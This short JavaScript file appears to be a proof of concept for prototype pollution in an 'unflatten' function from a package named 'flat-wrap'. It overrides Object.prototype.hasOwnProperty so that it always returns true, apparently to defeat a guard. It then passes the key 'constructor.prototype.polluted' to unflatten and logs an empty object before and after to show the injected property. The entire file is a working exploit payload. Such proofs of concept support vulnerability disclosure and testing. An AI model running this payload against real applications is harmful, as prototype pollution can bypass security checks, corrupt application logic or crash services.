Object.prototype.hasOwnProperty = () => true;
const {unflatten} = require('flat-wrap');
console.log({}.polluted);
unflatten({ 'constructor.prototype.polluted': 'yes' });
console.log({}.polluted);